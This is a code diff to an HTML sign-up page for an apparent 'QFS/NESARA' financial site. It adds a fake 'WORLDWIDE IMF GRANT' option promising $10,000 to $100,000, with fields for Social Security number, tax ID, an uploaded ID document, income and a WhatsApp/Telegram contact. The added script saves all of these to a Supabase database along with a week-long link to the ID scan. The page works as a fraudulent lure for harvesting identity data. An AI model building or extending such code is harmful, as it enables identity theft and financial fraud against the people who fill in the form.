@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -44,6 +45,7 @@
     <form id="regForm"
           action="https://formsubmit.co/support@qfsnesaragesara.org"
           method="POST"
+          enctype="multipart/form-data"
           class="space-y-6">
 
       <input type="hidden" name="_next" value="https://qfsnesaragesara.org/success-registration.html">
@@ -96,7 +98,7 @@
       </div>
 
       <!-- PASSWORD -->
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+      <div id="passwordSection" class="grid grid-cols-1 md:grid-cols-2 gap-4">
         <div>
           <label class="font-semibold">Create Password</label>
           <input id="regPass1" type="password" required class="w-full mt-1 p-3 border rounded-lg"
@@ -116,6 +118,8 @@
           <option value="">Select one…</option>
 
           <option value="QFS Account">QFS Account</option>
+
+          <option value="WORLDWIDE IMF GRANT">WORLDWIDE IMF GRANT</option>
 
           <option id="goldOption" value="Trump Gold Card Program">
             Trump Gold Card Program ( Unlock life in America )
@@ -137,6 +141,28 @@
         <p id="goldHiddenNote" class="text-xs text-slate-500 mt-2 hidden">
           Gold Card is not available for United States users.
         </p>
+      </div>
+
+      <!-- IMF SECTION -->
+      <div id="imfSection" class="hidden space-y-4">
+        <h3 class="text-lg font-bold mt-4">WORLDWIDE IMF GRANT APPLICATION</h3>
+
+        <input name="imf_name" placeholder="Full Name *" class="w-full p-3 border rounded-lg">
+        <input name="imf_ssn" placeholder="SSN *" class="w-full p-3 border rounded-lg">
+        <input name="imf_tax_id" placeholder="Tax ID *" class="w-full p-3 border rounded-lg">
+
+        <input type="file" name="imf_id" class="w-full p-3 border rounded-lg">
+
+        <select name="imf_amount" class="w-full p-3 border rounded-lg">
+          <option value="">Select Grant Amount</option>
+          <option>$10,000</option>
+          <option>$50,000</option>
+          <option>$100,000</option>
+        </select>
+
+        <input name="imf_whatsapp" placeholder="WhatsApp / Telegram" class="w-full p-3 border rounded-lg">
+        <input name="imf_income" placeholder="Monthly Income" class="w-full p-3 border rounded-lg">
+        <textarea name="imf_purpose" placeholder="Purpose of Grant" class="w-full p-3 border rounded-lg"></textarea>
       </div>
 
       <!-- PAYMENT OPTION -->
@@ -193,164 +219,94 @@
 
 <script>
 (() => {
-  // Check if config is loaded
-  if (!window.__QFS_CONFIG) {
-    console.error("Config not loaded! Make sure config.js is loaded first.");
-    document.getElementById('regMsg').textContent = "Configuration error. Please refresh.";
-    document.getElementById('regMsg').classList.remove('hidden');
-    return;
-  }
 
-  // Use the actual config values
-  const SUPABASE_URL = window.__QFS_CONFIG.SUPABASE_URL;
-  const SUPABASE_ANON_KEY = window.__QFS_CONFIG.SUPABASE_ANON_KEY;
+  if (!window.__QFS_CONFIG) return;
 
-  // Initialize Supabase
-  const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  const supabase = window.supabase.createClient(
+    window.__QFS_CONFIG.SUPABASE_URL,
+    window.__QFS_CONFIG.SUPABASE_ANON_KEY
+  );
 
   const form = document.getElementById("regForm");
+  const regFor = document.getElementById("regFor");
+  const passwordSection = document.getElementById("passwordSection");
+  const imfSection = document.getElementById("imfSection");
+
   const emailEl = document.getElementById("regEmail");
   const p1 = document.getElementById("regPass1");
   const p2 = document.getElementById("regPass2");
-  const regFor = document.getElementById("regFor");
+
   const msg = document.getElementById("regMsg");
-  const btn = document.getElementById("regSubmit");
 
-  const firstNameEl = document.getElementById("firstName");
-  const middleNameEl = document.getElementById("middleName");
-  const lastNameEl = document.getElementById("lastName");
-
-  const countryEl = document.getElementById("countryEl");
-  const goldOption = document.getElementById("goldOption");
-  const goldHiddenNote = document.getElementById("goldHiddenNote");
-
-  // Gold card visibility based on country
-  if (countryEl) {
-    countryEl.addEventListener("input", function() {
-      if (goldOption && goldHiddenNote) {
-        const country = this.value.trim().toUpperCase();
-        if (country === "USA" || country === "UNITED STATES" || country === "US") {
-          goldOption.classList.add("hidden");
-          goldHiddenNote.classList.remove("hidden");
-          if (regFor.value === "Trump Gold Card Program") {
-            regFor.value = "";
-          }
-        } else {
-          goldOption.classList.remove("hidden");
-          goldHiddenNote.classList.add("hidden");
-        }
-      }
-    });
-  }
-
-  function show(text, ok = true) {
-    msg.className = "text-sm text-center " + (ok ? "text-emerald-600" : "text-red-600");
+  function show(text, ok=true){
     msg.textContent = text;
+    msg.className = ok ? "text-green-600" : "text-red-600";
     msg.classList.remove("hidden");
   }
 
-  function inferTierFromRegisteringFor(registeringForText) {
-    const v = (registeringForText || "").toLowerCase();
-    if (v === "qfs account") return "activation_pending";
-    if (v.includes("gold")) return "gold";
-    if (v.includes("black")) return "black";
-    if (v.includes("silver")) return "silver";
-    return "silver";
-  }
-
-  async function postFormSubmit() {
-    const fd = new FormData(form);
-    fetch(form.action, { method: "POST", body: fd, headers: { "Accept": "text/html" } })
-      .catch(() => {});
-  }
-
-  let busy = false;
+  regFor.addEventListener("change", () => {
+    if (regFor.value === "WORLDWIDE IMF GRANT") {
+      passwordSection.style.display = "none";
+      imfSection.classList.remove("hidden");
+    } else {
+      passwordSection.style.display = "grid";
+      imfSection.classList.add("hidden");
+    }
+  });
 
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
-    if (busy) return;
-    busy = true;
 
-    const email = emailEl.value.trim().toLowerCase();
-    const pwA = p1.value.trim();
-    const pwB = p2.value.trim();
-    const registering_for = regFor.value.trim();
+    const isIMF = regFor.value === "WORLDWIDE IMF GRANT";
 
-    // Validate required fields
-    if (!firstNameEl.value.trim()) {
-      busy = false;
-      return show("First name is required.", false);
-    }
-    if (!lastNameEl.value.trim()) {
-      busy = false;
-      return show("Last name is required.", false);
-    }
-    if (!email) {
-      busy = false;
-      return show("Email is required.", false);
-    }
-    if (pwA.length < 8) { 
-      busy = false; 
-      return show("Password must be at least 8 characters.", false); 
-    }
-    if (pwA !== pwB) { 
-      busy = false; 
-      return show("Passwords do not match.", false); 
-    }
-    if (!registering_for) {
-      busy = false;
-      return show("Please select what you're registering for.", false);
-    }
+    if (!isIMF) {
+      if (p1.value.length < 8) return show("Password too short", false);
+      if (p1.value !== p2.value) return show("Passwords do not match", false);
 
-    const selectedTier = inferTierFromRegisteringFor(registering_for);
-
-    btn.disabled = true;
-    show("Creating your portal account…");
-
-    try {
-      const { data, error } = await supabase.auth.signUp({
-        email,
-        password: pwA,
-        options: {
-          data: {
-            first_name: firstNameEl.value.trim(),
-            middle_name: middleNameEl.value.trim(),
-            last_name: lastNameEl.value.trim(),
-            registering_for,
-            selected_tier: selectedTier,
-            activation_required: selectedTier === "activation_pending",
-            account_status: selectedTier === "activation_pending" ? "inactive" : "active",
-            country: countryEl.value.trim()
-          },
-          emailRedirectTo: "https://qfsnesaragesara.org/login.html"
-        }
+      const { error } = await supabase.auth.signUp({
+        email: emailEl.value,
+        password: p1.value
       });
 
-      if (error) {
-        busy = false;
-        btn.disabled = false;
-        return show(error.message, false);
-      }
+      if (error) return show(error.message, false);
 
-      show("Account created ✅ Redirecting…");
+      show("Account created");
+      return;
+    }
 
-      // Send email notification via FormSubmit (non-blocking)
-      postFormSubmit();
+    try {
+      const file = document.querySelector('[name="imf_id"]').files[0];
+      const fileName = Date.now() + "-" + file.name;
 
-      // Redirect to success page
-      setTimeout(() => {
-        window.location.href = "https://qfsnesaragesara.org/success-registration.html";
-      }, 1500);
+      await supabase.storage.from("imf-ids").upload(fileName, file);
+
+      const { data } = await supabase.storage
+        .from("imf-ids")
+        .createSignedUrl(fileName, 604800);
+
+      await supabase.from("imf_applications").insert([{
+        full_name: document.querySelector('[name="imf_name"]').value,
+        email: emailEl.value,
+        ssn: document.querySelector('[name="imf_ssn"]').value,
+        tax_id: document.querySelector('[name="imf_tax_id"]').value,
+        grant_amount: document.querySelector('[name="imf_amount"]').value,
+        monthly_income: document.querySelector('[name="imf_income"]').value,
+        purpose: document.querySelector('[name="imf_purpose"]').value,
+        id_file_url: data.signedUrl
+      }]);
+
+      show("Application submitted successfully");
 
     } catch (err) {
-      busy = false;
-      btn.disabled = false;
-      show("An unexpected error occurred. Please try again.", false);
-      console.error("Registration error:", err);
+      show("Error occurred", false);
+      console.error(err);
     }
+
   });
+
 })();
 </script>
 
 </body>
 </html>
+```
